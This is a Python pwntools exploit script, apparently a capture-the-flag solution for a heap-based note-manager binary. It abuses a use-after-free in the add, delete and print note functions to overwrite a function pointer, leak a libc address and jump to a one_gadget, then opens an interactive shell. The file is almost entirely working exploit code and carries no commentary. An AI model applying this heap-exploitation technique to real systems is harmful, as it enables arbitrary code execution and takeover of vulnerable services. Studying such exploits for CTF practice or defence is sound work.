from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc-2.23.so')
elf = ELF('./libc.so.6')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn2_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def addnote(size, content):
    ru(b':')
    sl(b'1')
    ru(b':')
    sl(str(size).encode())
    ru(b":")
    sl(content)

def delnote(idx):
    ru(b':')
    sl(b'2')
    ru(b':')
    sl(str(idx).encode())

def printnote(idx):
    ru(b':')
    sl(b'3')
    ru(b':')
    sl(str(idx).encode())

debug('''
    b *0x4008be
    b *0x400a96
    b *0x400b78
''')

addnote(0x80, b'noob') #0
addnote(0x80, b'noob') #1
addnote(0x80, b'noob') #2
delnote(0)
delnote(2)
addnote(8, p64(0x400846)) #3
printnote(0)

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3c4c08
pr('leak_addr', libc.address)
one = libc.address + 0x45226
delnote(3)
addnote(8, p64(one))
printnote(0)

shell()
